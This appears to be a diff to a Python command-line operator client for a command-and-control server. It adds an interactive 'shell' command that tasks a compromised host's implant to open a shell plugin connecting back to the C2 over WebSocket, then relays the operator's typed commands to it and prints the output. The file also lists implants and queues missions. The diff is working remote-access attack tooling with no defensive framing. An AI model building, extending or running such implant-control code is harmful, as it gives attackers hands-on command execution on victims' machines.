@@ -2,9 +2,13 @@ import click
 import requests
 import json
 import time
+import threading
+import asyncio
+import websockets
 
 # --- Configuration ---
-C2_URL = "http://127.0.0.1:8000/api"
+C2_URL_HTTP = "http://127.0.0.1:8000/api"
+C2_URL_WS = "ws://127.0.0.1:8000/api"
 
 # --- Helper Functions ---
 def handle_request_error(e):
@@ -33,7 +37,7 @@ def cli():
 def list_implants():
     """List all registered implants and their status."""
     try:
-        response = requests.get(f"{C2_URL}/admin/implants")
+        response = requests.get(f"{C2_URL_HTTP}/admin/implants")
         response.raise_for_status()
         implants = response.json()
         if not implants:
@@ -116,6 +120,66 @@ def run_mission(implant_id, mission_name):
             return
 
     click.echo(click.style(f"\nMission '{mission_name}' successfully queued.", fg="green", bold=True))
+
+# --- Interactive Shell Command ---
+def receive_handler(ws):
+    """A simple receiver loop that runs in a thread."""
+    while True:
+        try:
+            message = ws.recv()
+            # Print the received output, ensuring it doesn't end with a newline
+            # that would mess up the prompt.
+            print(message, end='', flush=True)
+        except websockets.exceptions.ConnectionClosed:
+            print("\n[!] Connection to C2 closed.")
+            break
+
+@cli.command("shell")
+@click.argument("implant_id")
+def interactive_shell(implant_id):
+    """Start an interactive shell session with an implant."""
+    # 1. Task the implant to start the shell plugin via HTTP
+    click.echo(f"[*] Requesting shell on implant {implant_id}...")
+    ws_uri_for_implant = f"{C2_URL_WS}/ws/implant/{implant_id}"
+    task_payload = {
+        "command": "start_plugin",
+        "args": {"plugin_name": "shell", "uri": ws_uri_for_implant}
+    }
+    try:
+        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
+        response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        handle_request_error(e)
+        return
+
+    # 2. Connect to the CLI-facing WebSocket endpoint
+    ws_uri_for_cli = f"{C2_URL_WS}/ws/cli/{implant_id}"
+    click.echo(f"[*] Connecting to shell session at {ws_uri_for_cli}...")
+
+    try:
+        with websockets.sync.client.connect(ws_uri_for_cli) as websocket:
+            click.echo(click.style("[+] Connected! Type 'exit' to quit.", fg="green"))
+
+            # Start a receiver thread to print output from the shell
+            receiver_thread = threading.Thread(target=receive_handler, args=(websocket,))
+            receiver_thread.daemon = True
+            receiver_thread.start()
+
+            # Main loop to send commands from the operator
+            while True:
+                command = input()
+                if command.lower() == 'exit':
+                    break
+
+                # Append newline so the shell executes the command
+                full_command = command + "\n"
+                websocket.send(full_command)
+
+        click.echo(click.style("[+] Shell session terminated.", fg="yellow"))
+
+    except Exception as e:
+        click.echo(f"[!] Error during shell session: {e}", err=True)
+
 
 if __name__ == "__main__":
     cli()
